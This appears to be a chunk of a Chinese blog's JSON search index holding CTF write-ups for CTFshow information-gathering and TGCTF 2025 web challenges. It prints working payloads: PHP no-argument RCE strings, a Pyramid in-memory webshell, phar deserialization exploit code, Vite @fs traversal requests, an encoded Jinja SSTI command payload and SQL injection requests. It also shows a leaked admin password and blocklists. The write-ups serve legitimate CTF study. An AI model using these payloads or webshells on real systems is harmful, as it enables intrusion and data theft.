根据hint知道editor处应该有信息泄漏(虽然不知道什么是editor)\n我们先用dirsearch扫一下后台\n访问url/editor\n是一个文字编辑的页面，我们可以发现在上传附件📎出可以调用出到服务器的文件管理器\n在服务器的根目录没看到flag，尝试查看网站的根目录(var/www/html),看看有没有隐藏页面\n发现nothinghere文件夹中有个fl00g.txt文件\n访问url/nothinghere/f1000g.txt即可得到flag\nweb15 扫描到后台为url/admin，打开看到有个忘记密码，要求输入城市\n根据hint我们可以在主页底部找到一个qq邮箱，查询一下qq号\n得到信息，现居陕西西安\n输入西安成功重置密码，输入重置密码和帐号admin，成功得到flag\nWeb16 探针泄漏\ndirsearch 扫描不到这个探针，看wp才知道的\n探针在url/tz.php\n访问探针\n在指针里面可以找到phpinfo页面\n打开在phpinfo里面可以找到flag\nweb17 sql备份泄漏\n用dirsearch扫出来存在sql备份泄漏，下载backup.sql，打开得到flag\nweb18 本题是一个游戏，玩到101分就能得到flag\n我们直接看js\nFlappy_js.js\n审一下代码，我们可以看到当分数大于100的时候会输出这段文字，这段文字看着像unidcode编码，解码试试\n根据提示访问url/110.php,得到flag\nweb19 题目是一个登录的页面，根据hint查看网页源代码\n根据提示，这道题应该是一道对密码进行了加密的题目\n审阅一下代码我们得到这些信息\nmode模式： CBC padding 填充方式： ZeroPadding 密文输出编码： 十六进制hex 偏移量iv: ilove36dverymuch 密钥：0000000372619038 密文为： a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04\nAES 加密/解密 - 锤子在线工具\n用解密工具解密一下密文我们可以得到密码为\n输入密码，得到flag\nweb20 hint：mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了。\n这是一个使用access数据库的asp程序\n根据提示本题存在mdb文件泄露，那我们直接访问url/db/db.mdb\n下载db.mdb文件后用记事本打开搜索flag，即可得到 flag{ctfshow_old_database}\n","permalink":"http://localhost:1313/post/ctfshow/ctfshow_%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/","summary":"\u003ch4 id=\"web-1-5\"\u003eWeb 1-5\u003c/h4\u003e\n\u003cul\u003e\n\u003cli\u003e查看网页源代码\u003c/li\u003e\n\u003cli\u003e抓个包看有没有藏东西\u003c/li\u003e\n\u003cli\u003e查看robots.txt\u003c/li\u003e\n\u003cli\u003ephps源码泄露，访问index.phps，通过其源码泄露，在其中找到flag\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"web6\"\u003eWeb6\u003c/h4\u003e\n\u003cp\u003e网页提示下载源码查看，访问url/www.zip得到源码文件\u003c/p\u003e","title":"CTFSHOW-信息收集-Writeup"},{"content":"A common student at GDUFS\u0026hellip;\n","permalink":"http://localhost:1313/about/","summary":"about","title":"关于"},{"content":"","permalink":"http://localhost:1313/links/","summary":"links","title":"友链"},{"content":"Web (ez)upload hint写有源码泄露\nindex.php.bak拿源码\n1\u0026lt;?php 2define(\u0026#39;UPLOAD_PATH\u0026#39;, __DIR__ . \u0026#39;/uploads/\u0026#39;); 3$is_upload = false; 4$msg = null; 5$status_code = 200; // 默认状态码为 200 6if (isset($_POST[\u0026#39;submit\u0026#39;])) { 7 if (file_exists(UPLOAD_PATH)) { 8 $deny_ext = array(\u0026#34;php\u0026#34;, \u0026#34;php5\u0026#34;, \u0026#34;php4\u0026#34;, \u0026#34;php3\u0026#34;, \u0026#34;php2\u0026#34;, \u0026#34;html\u0026#34;, \u0026#34;htm\u0026#34;, \u0026#34;phtml\u0026#34;, \u0026#34;pht\u0026#34;, \u0026#34;jsp\u0026#34;, \u0026#34;jspa\u0026#34;, \u0026#34;jspx\u0026#34;, \u0026#34;jsw\u0026#34;, \u0026#34;jsv\u0026#34;, \u0026#34;jspf\u0026#34;, \u0026#34;jtml\u0026#34;, \u0026#34;asp\u0026#34;, \u0026#34;aspx\u0026#34;, \u0026#34;asa\u0026#34;, \u0026#34;asax\u0026#34;, \u0026#34;ascx\u0026#34;, \u0026#34;ashx\u0026#34;, \u0026#34;asmx\u0026#34;, \u0026#34;cer\u0026#34;, \u0026#34;swf\u0026#34;, \u0026#34;htaccess\u0026#34;); 9 10 if (isset($_GET[\u0026#39;name\u0026#39;])) { 11 $file_name = $_GET[\u0026#39;name\u0026#39;]; 12 } else { 13 $file_name = basename($_FILES[\u0026#39;name\u0026#39;][\u0026#39;name\u0026#39;]); 14 } 15 $file_ext = pathinfo($file_name, PATHINFO_EXTENSION); 16 17 if (!in_array($file_ext, $deny_ext)) { 18 $temp_file = $_FILES[\u0026#39;name\u0026#39;][\u0026#39;tmp_name\u0026#39;]; 19 $file_content = file_get_contents($temp_file); 20 21 if (preg_match(\u0026#39;/.+?\u0026lt;/s\u0026#39;, $file_content)) { 22 $msg = \u0026#39;文件内容包含非法字符，禁止上传！\u0026#39;; 23 $status_code = 403; // 403 表示禁止访问 24 } else { 25 $img_path = UPLOAD_PATH . $file_name; 26 if (move_uploaded_file($temp_file, $img_path)) { 27 $is_upload = true; 28 $msg = \u0026#39;文件上传成功！\u0026#39;; 29 } else { 30 $msg = \u0026#39;上传出错！\u0026#39;; 31 $status_code = 500; // 500 表示服务器内部错误 32 } 33 } 34 } else { 35 $msg = \u0026#39;禁止保存为该类型文件！\u0026#39;; 36 $status_code = 403; // 403 表示禁止访问 37 } 38 } else { 39 $msg = UPLOAD_PATH . \u0026#39;文件夹不存在,请手工创建！\u0026#39;; 40 $status_code = 404; // 404 表示资源未找到 41 } 42} 43 44// 设置 HTTP 状态码 45http_response_code($status_code); 46 47// 输出结果 48echo json_encode([ 49 \u0026#39;status_code\u0026#39; =\u0026gt; $status_code, 50 \u0026#39;msg\u0026#39; =\u0026gt; $msg, 51]); 审计一下代码，看到有个name，可以对文件名进行修改，想到目录穿越\n利用这个进行目录穿越，把.user.ini传到web目录，然后文件包含1.jpg\n连蚁剑拿flag\nAAA偷渡阴平 无参RCE\n1?tgctf2025=system(end(current(get_defined_vars())));\u0026amp;b=tac /flag AAA偷渡阴平（复仇） 利用session_id打无参RCE\n1/?tgctf2025=session_start();system(hex2bin(session_id())); 将cookie改为\n1PHPSESSID=636174202f662a 熟悉的配方，熟悉的味道 题目\n1from pyramid.config import Configurator 2from pyramid.request import Request 3from pyramid.response import Response 4from pyramid.view import view_config 5from wsgiref.simple_server import make_server 6from pyramid.events import NewResponse 7import re 8from jinja2 import Environment, BaseLoader 9 10eval_globals = { #防止eval执行恶意代码 11 \u0026#39;__builtins__\u0026#39;: {}, # 禁用所有内置函数 12 \u0026#39;__import__\u0026#39;: None # 禁止动态导入 13} 14 15 16def checkExpr(expr_input): 17 expr = re.split(r\u0026#34;[-+*/]\u0026#34;, expr_input) 18 print(exec(expr_input)) 19 20 if len(expr) != 2: 21 return 0 22 try: 23 int(expr[0]) 24 int(expr[1]) 25 except: 26 return 0 27 28 return 1 29 30 31def home_view(request): 32 expr_input = \u0026#34;\u0026#34; 33 result = \u0026#34;\u0026#34; 34 35 if request.method == \u0026#39;POST\u0026#39;: 36 expr_input = request.POST[\u0026#39;expr\u0026#39;] 37 if checkExpr(expr_input): 38 try: 39 result = eval(expr_input, eval_globals) 40 except Exception as e: 41 result = e 42 else: 43 result = \u0026#34;爬！\u0026#34; 44 45 46 template_str = 【xxx】 47 48 env = Environment(loader=BaseLoader()) 49 template = env.from_string(template_str) 50 rendered = template.render(expr_input=expr_input, result=result) 51 return Response(rendered) 52 53 54if __name__ == \u0026#39;__main__\u0026#39;: 55 with Configurator() as config: 56 config.add_route(\u0026#39;home_view\u0026#39;, \u0026#39;/\u0026#39;) 57 config.add_view(home_view, route_name=\u0026#39;home_view\u0026#39;) 58 app = config.make_wsgi_app() 59 60 server = make_server(\u0026#39;0.0.0.0\u0026#39;, 9040, app) 61 server.serve_forever() 审计一下发现在checkExpr处会将传入的内容用exec进行执行\n1def checkExpr(expr_input): 2 expr = re.split(r\u0026#34;[-+*/]\u0026#34;, expr_input) 3 print(exec(expr_input)) 4 5 if len(expr) != 2: 6 return 0 7 try: 8 int(expr[0]) 9 int(expr[1]) 10 except: 11 return 0 12 13 return 1 测一下发现题目不出网，打pyramid内存马\n参考\nhttps://forum.butian.net/share/3974\n1def waff(): 2 def f(): 3 yield g.gi_frame.f_back 4 5 g = f() 6 frame = next(g) 7 b = frame.f_back.f_back.f_globals 8 def hello(request): 9 code = request.params[\u0026#39;code\u0026#39;] 10 res=eval(code) 11 return Response(res) 12 13 config.add_route(\u0026#39;shellb\u0026#39;, \u0026#39;/shellb\u0026#39;) 14 config.add_view(hello, route_name=\u0026#39;shellb\u0026#39;) 15 config.commit() 16 17waff() 在/shellb处命令执行拿flag即可\n什么文件上传？ robots.txt里面看到一个class.php\n/class.php\nphp反序列化\nexp\n1\u0026lt;?php 2class yesterday { 3 public $learn; 4 public $study=\u0026#34;study\u0026#34;; 5 public $try; 6} 7class today { 8 public $doing; 9 public $did; 10 public $done; 11} 12class future{ 13 private $impossible=\u0026#34;How can you get here?\u0026lt;br\u0026gt;\u0026#34;; 14 private $out; 15 private $no; 16} 17$a = new yesterday(); 18$a -\u0026gt; study = new today(); 19$a -\u0026gt; study -\u0026gt; doing = new future(); 20 21 22echo base64_encode(base64_encode(base64_encode(base64_encode(base64_encode(serialize($a)))))); 23 24?\u0026gt; 传入时会截断后4位，随便在后面加几个字符串就好\n接下来wow传参RCE拿flag就行\n什么文件上传？（复仇） 上一题可以拿到upload.php的源码\n1\u0026lt;?php 2if(isset($_FILES[\u0026#39;file\u0026#39;])) { 3 $uploadDir = \u0026#39;uploads/\u0026#39;; 4 if(!file_exists($uploadDir)) { 5 mkdir($uploadDir, 0777, true); 6 } 7 8 // 白名单允许的扩展名 9 $allowedExtensions = [\u0026#39;atg\u0026#39;]; 10 $fileName = basename($_FILES[\u0026#39;file\u0026#39;][\u0026#39;name\u0026#39;]); 11 $fileExtension = strtolower(pathinfo($fileName, PATHINFO_EXTENSION)); 12 13 // 检查文件扩展名 14 if(!in_array($fileExtension, $allowedExtensions)) { 15 die(\u0026#34;hacker！\u0026#34;); 16 } 17 18 $uploadFile = $uploadDir . $fileName; 19 20 if(move_uploaded_file($_FILES[\u0026#39;file\u0026#39;][\u0026#39;tmp_name\u0026#39;], $uploadFile)) { 21 echo \u0026#34;文件已保存到：$uploadFile ！\u0026#34;; 22 } else { 23 echo \u0026#34;文件保存出错！\u0026#34;; 24 } 25} 26?\u0026gt; class.php\n1\u0026lt;?php 2highlight_file(__FILE__); 3error_reporting(0); 4function best64_decode($str) 5{ 6 return base64_encode(md5(base64_encode(md5($str)))); 7 } 8class yesterday { 9 public $learn; 10 public $study=\u0026#34;study\u0026#34;; 11 public $try; 12 public function __construct() 13 { 14 $this-\u0026gt;learn = \u0026#34;learn\u0026lt;br\u0026gt;\u0026#34;; 15 } 16 public function __destruct() 17 { 18 echo \u0026#34;You studied hard yesterday.\u0026lt;br\u0026gt;\u0026#34;; 19 return $this-\u0026gt;study-\u0026gt;hard(); 20 } 21} 22class today { 23 public $doing; 24 public $did; 25 public $done; 26 public function __construct(){ 27 $this-\u0026gt;did = \u0026#34;What you did makes you outstanding.\u0026lt;br\u0026gt;\u0026#34;; 28 } 29 public function __call($arg1, $arg2) 30 { 31 $this-\u0026gt;done = \u0026#34;And what you\u0026#39;ve done has given you a choice.\u0026lt;br\u0026gt;\u0026#34;; 32 echo $this-\u0026gt;done; 33 if(md5(md5($this-\u0026gt;doing))==666){ 34 return $this-\u0026gt;doing(); 35 } 36 else{ 37 return $this-\u0026gt;doing-\u0026gt;better; 38 } 39 } 40} 41class tommoraw { 42 public $good; 43 public $bad; 44 public $soso; 45 public function __invoke(){ 46 $this-\u0026gt;good=\u0026#34;You\u0026#39;ll be good tommoraw!\u0026lt;br\u0026gt;\u0026#34;; 47 echo $this-\u0026gt;good; 48 } 49 public function __get($arg1){ 50 $this-\u0026gt;bad=\u0026#34;You\u0026#39;ll be bad tommoraw!\u0026lt;br\u0026gt;\u0026#34;; 51 } 52 53} 54class future{ 55 private $impossible=\u0026#34;How can you get here?\u0026lt;br\u0026gt;\u0026#34;; 56 private $out; 57 private $no; 58 public $useful1;public $useful2;public $useful3;public $useful4;public $useful5;public $useful6;public $useful7;public $useful8;public $useful9;public $useful10;public $useful11;public $useful12;public $useful13;public $useful14;public $useful15;public $useful16;public $useful17;public $useful18;public $useful19;public $useful20; 59 60 public function __set($arg1, $arg2) { 61 if ($this-\u0026gt;out-\u0026gt;useful7) { 62 echo \u0026#34;Seven is my lucky number\u0026lt;br\u0026gt;\u0026#34;; 63 system(\u0026#39;whoami\u0026#39;); 64 } 65 } 66 public function __toString(){ 67 echo \u0026#34;This is your future.\u0026lt;br\u0026gt;\u0026#34;; 68 system($_POST[\u0026#34;wow\u0026#34;]); 69 return \u0026#34;win\u0026#34;; 70 } 71 public function __destruct(){ 72 $this-\u0026gt;no = \u0026#34;no\u0026#34;; 73 return $this-\u0026gt;no; 74 } 75} 76if (file_exists($_GET[\u0026#39;filename\u0026#39;])){ 77 echo \u0026#34;Focus on the previous step!\u0026lt;br\u0026gt;\u0026#34;; 78} 79else{ 80 $data=substr($_GET[\u0026#39;filename\u0026#39;],0,-4); 81 unserialize(best64($data)); 82} 83// You learn yesterday, you choose today, can you get to your future? 84?\u0026gt; 这题把直接反序列化写死了\n但是我们可以利用file_exists和文件上传打phar反序列化\n拿上一题的exp改一改\n1\u0026lt;?php 2class yesterday { 3 public $learn; 4 public $study=\u0026#34;study\u0026#34;; 5 public $try; 6} 7class today { 8 public $doing; 9 public $did; 10 public $done; 11} 12class future{ 13 private $impossible=\u0026#34;How can you get here?\u0026lt;br\u0026gt;\u0026#34;; 14 private $out; 15 private $no; 16} 17$a = new yesterday(); 18$a -\u0026gt; study = new today(); 19$a -\u0026gt; study -\u0026gt; doing = new future(); 20 21$phar = new Phar(\u0026#34;1.phar\u0026#34;); 22$phar-\u0026gt;startBuffering(); 23$phar-\u0026gt;setStub(\u0026#34;\u0026lt;php __HALT_COMPILER(); ?\u0026gt;\u0026#34;); //设置stub 24$phar-\u0026gt;setMetadata($a); //将自定义meta-data存入manifest 25$phar-\u0026gt;addFromString(\u0026#34;a\u0026#34;, \u0026#34;\u0026#34;); //添加要压缩的文件 26$phar-\u0026gt;stopBuffering(); 27 28?\u0026gt; 改为1.atg文件上传到uploads目录\n在class.php处传入\n1?filename=phar://./uploads/1.atg 实现RCE\n前端GAME CVE-2025-30208\n1URL/@fs/tgflagggg?import\u0026amp;raw?? 前端GAME Plus CVE-2025-31125\n1URL/@fs/tgflagggg?meteorkai.svg?.wasm?init 前端GAME Ultra https://mp.weixin.qq.com/s/HMhzXqSplWa-IwpftxwTiA\nCVE-2025-32395\n1curl --request-target /@fs/app/#/../../../../../tgflagggg URL TG_wordpress 在robots.txt里面看到这两个\n/.tmp/vuln和/.tmp/.bak\n一个二进制文件和一个fscan的扫描结果\n1fscan.exe -h 101.37.149.223 -ping 2 3 ___ _ 4 / _ \\ ___ ___ _ __ __ _ ___| | __ 5 / /_\\/____/ __|/ __| \u0026#39;__/ _` |/ __| |/ / 6/ /_\\\\_____\\__ \\ (__| | | (_| | (__| \u0026lt; 7\\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ 8 fscan version: 1.8.4 9start infoscan 10101.37.149.223:22 open 11101.37.149.223:80 open 12101.37.149.223:443 open 13101.37.149.223:3306 open 14101.37.149.223:27645 open 15101.37.149.223:27646 open 16101.37.149.223:27647 open 17101.37.149.223:27648 open 18101.37.149.223:27649 open 19101.37.149.223:27650 open 20101.37.149.223:27651 open 21101.37.149.223:27652 open 22101.37.149.223:27653 open 23101.37.149.223:27654 open 24101.37.149.223:27655 open 25101.37.149.223:27656 open 26101.37.149.223:27657 open 27101.37.149.223:27658 open 28101.37.149.223:27659 open 29101.37.149.223:27660 open 30101.37.149.223:27661 open 31101.37.149.223:27662 open 32101.37.149.223:33376 open 33101.37.149.223:52013 open 猜到要打pwn\nnc 101.37.149.223 52013\n验证猜想\n静态编译，而且主函数只有一个get\n直接ROPgadget\u0026ndash;ropchain梭哈\n1================================== + HINT(not flag/FLAG): + username/password: + TG_wordpressor + aXx^oV@K\u0026amp;cFoVaztQ* + + All hints have the same content + obtaining one is enough ================================== 拿到后台账户密码\nTG_wordpressor/aXx^oV@K\u0026amp;cFoVaztQ*\n登进后台找到插件列表 wp-file-manager版本为6.0\nhttps://blog.csdn.net/hongduilanjun/article/details/132851717\n1tgctf{CVE-2020-25213} 火眼辩魑魅 tgshell.php\n直接连蚁剑读flag了\n直面天命 把路由爆破出来，/aazz\n直接读flag即可\n1?filename=/flag 2//TGCTF{05ee064a-ef29-6e6c-718e-746b002f727e} 直面天命（复仇） 源码\n1import os 2import string 3from flask import Flask, request, render_template_string, jsonify, send_from_directory 4from a.b.c.d.secret import secret_key 5 6app = Flask(__name__) 7 8black_list=[\u0026#39;lipsum\u0026#39;,\u0026#39;|\u0026#39;,\u0026#39;%\u0026#39;,\u0026#39;{\u0026#39;,\u0026#39;}\u0026#39;,\u0026#39;map\u0026#39;,\u0026#39;chr\u0026#39;, \u0026#39;value\u0026#39;, \u0026#39;get\u0026#39;, \u0026#34;url\u0026#34;, \u0026#39;pop\u0026#39;,\u0026#39;include\u0026#39;,\u0026#39;popen\u0026#39;,\u0026#39;os\u0026#39;,\u0026#39;import\u0026#39;,\u0026#39;eval\u0026#39;,\u0026#39;_\u0026#39;,\u0026#39;system\u0026#39;,\u0026#39;read\u0026#39;,\u0026#39;base\u0026#39;,\u0026#39;globals\u0026#39;,\u0026#39;_.\u0026#39;,\u0026#39;set\u0026#39;,\u0026#39;application\u0026#39;,\u0026#39;getitem\u0026#39;,\u0026#39;request\u0026#39;, \u0026#39;+\u0026#39;, \u0026#39;init\u0026#39;, \u0026#39;arg\u0026#39;, \u0026#39;config\u0026#39;, \u0026#39;app\u0026#39;, \u0026#39;self\u0026#39;] 9def waf(name): 10 for x in black_list: 11 if x in name.lower(): 12 return True 13 return False 14def is_typable(char): 15 # 定义可通过标准 QWERTY 键盘输入的字符集 16 typable_chars = string.ascii_letters + string.digits + string.punctuation + string.whitespace 17 return char in typable_chars 18 19@app.route(\u0026#39;/\u0026#39;) 20def home(): 21 return send_from_directory(\u0026#39;static\u0026#39;, \u0026#39;index.html\u0026#39;) 22 23@app.route(\u0026#39;/jingu\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) 24def greet(): 25 template1=\u0026#34;\u0026#34; 26 template2=\u0026#34;\u0026#34; 27 name = request.form.get(\u0026#39;name\u0026#39;) 28 template = f\u0026#39;{name}\u0026#39; 29 if waf(name): 30 template = \u0026#39;想干坏事了是吧hacker？哼，还天命人，可笑，可悲，可叹 31\u0026#39; 32 else: 33 k=0 34 for i in name: 35 if is_typable(i): 36 continue 37 k=1 38 break 39 if k==1: 40 if not (secret_key[:2] in name and secret_key[2:]): 41 template = \u0026#39;连“六根”都凑不齐，谈什么天命不天命的，还是戴上这金箍吧 42 43再去西行历练历练 44\u0026#39; 45 return render_template_string(template) 46 template1 = \u0026#34;“六根”也凑齐了，你已经可以直面天命了！我帮你把“secret_key”替换为了“{{}}” 47最后，如果你用了cat，就可以见到齐天大圣了 48\u0026#34; 49 template= template.replace(\u0026#34;天命\u0026#34;,\u0026#34;{{\u0026#34;).replace(\u0026#34;难违\u0026#34;,\u0026#34;}}\u0026#34;) 50 template = template 51 if \u0026#34;cat\u0026#34; in template: 52 template2 = \u0026#39; 53或许你这只叫天命人的猴子，真的能做到？ 54\u0026#39; 55 try: 56 return template1+render_template_string(template)+render_template_string(template2) 57 except Exception as e: 58 error_message = f\u0026#34;500报错了，查询语句如下： 59{template}\u0026#34; 60 return error_message, 400 61 62@app.route(\u0026#39;/hint\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) 63def hinter(): 64 template=\u0026#34;hint： 65有一个aazz路由，去那里看看吧，天命人!\u0026#34; 66 return render_template_string(template) 67 68@app.route(\u0026#39;/aazz\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) 69def finder(): 70 with open(__file__, \u0026#39;r\u0026#39;) as f: 71 source_code = f.read() 72 return f\u0026#34; 73{source_code} 74\u0026#34;, 200, {\u0026#39;Content-Type\u0026#39;: \u0026#39;text/html; charset=utf-8\u0026#39;} 75 76if __name__ == \u0026#39;__main__\u0026#39;: 77 app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=80) 打ssti\npayload\n1天命((cycler.next[\u0026#34;\\x5f\\x5f\\x67\\x6c\\x6f\\x62\\x61\\x6c\\x73\\x5f\\x5f\u0026#34;][\u0026#34;\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f\u0026#34;][\u0026#34;\\x5f\\x5f\\x69\\x6d\\x70\\x6f\\x72\\x74\\x5f\\x5f\u0026#34;](\u0026#39;o\u0026#39;\u0026#39;s\u0026#39;))[\u0026#39;p\u0026#39;\u0026#39;open\u0026#39;](\u0026#39;cat /flag\u0026#39;))[\u0026#39;r\u0026#39;\u0026#39;ead\u0026#39;]()难违 TGCTF 2025 后台管理 题目给了后台的一个账号，tg/tg123\n进后台发现什么都没有，甚至可以直接在cookie改身份\n回到登录界面尝试万能密码发现有waf，那应该要打sql\nwaf了单引号,通过转义绕过即可\n1username=admin\\\u0026amp;password=or 1=1# 尝试联合注入，set-cookie处有回显\n但是有长度限制，在读表名处卡了很久\n后面直接猜表名是flag，直接打无列名\nhttps://www.cnblogs.com/q1stop/p/18024992\n利用join打无列名\n1POST /login HTTP/1.1 2Host: 124.71.147.99:9045 3Accept-Language: zh-CN,zh;q=0.9 4Content-Type: application/x-www-form-urlencoded 5Cache-Control: max-age=0 6Origin: http://124.71.147.99:9045 7User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 8Referer: http://124.71.147.99:9045/login 9Accept-Encoding: gzip, deflate 10Upgrade-Insecure-Requests: 1 11Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 12Content-Length: 25 13 14username=admin\\\u0026amp;password={{urlenc(union select * from (select * from flag a join flag b)c#)}} 1POST /login HTTP/1.1 2Host: 124.71.147.99:9045 3Accept-Language: zh-CN,zh;q=0.9 4Content-Type: application/x-www-form-urlencoded 5Cache-Control: max-age=0 6Origin: http://124.71.147.99:9045 7User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 8Referer: http://124.71.147.99:9045/login 9Accept-Encoding: gzip, deflate 10Upgrade-Insecure-Requests: 1 11Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 12Content-Length: 25 13 14username=admin\\\u0026amp;password={{urlenc(union select value,2 from flag#)}} 1TGCTF{ac4ca16f-f1508c-000342} ","permalink":"http://localhost:1313/post/tgctf_2025/","summary":"\u003ch2 id=\"web\"\u003eWeb\u003c/h2\u003e\n\u003ch3 id=\"ezupload\"\u003e\u003cstrong\u003e(ez)upload\u003c/strong\u003e\u003c/h3\u003e\n\u003cp\u003ehint写有源码泄露\u003c/p\u003e\n\u003cp\u003eindex.php.bak拿源码\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 1\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u0026lt;?php\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 2\u003c/span\u003e\u003cspan class=\"cl\"\u003edefine\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;UPLOAD_PATH\u0026#39;\u003c/span\u003e, __DIR__ . \u003cspan class=\"s1\"\u003e\u0026#39;/uploads/\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 3\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$is_upload\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e false\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 4\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$msg\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e null\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 5\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$status_code\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e 200\u003cspan class=\"p\"\u003e;\u003c/span\u003e // 默认状态码为 \u003cspan class=\"m\"\u003e200\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 6\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003eisset\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$_POST\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;submit\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e]))\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 7\u003c/span\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003efile_exists\u003cspan class=\"o\"\u003e(\u003c/span\u003eUPLOAD_PATH\u003cspan class=\"o\"\u003e))\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 8\u003c/span\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003e$deny_ext\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e array\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;php\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;php5\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;php4\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;php3\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;php2\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;html\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;htm\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;phtml\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;pht\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;jsp\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;jspa\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;jspx\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;jsw\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;jsv\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;jspf\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;jtml\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;asp\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;aspx\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;asa\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;asax\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;ascx\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;ashx\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;asmx\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;cer\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;swf\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;htaccess\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 9\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e10\u003c/span\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan 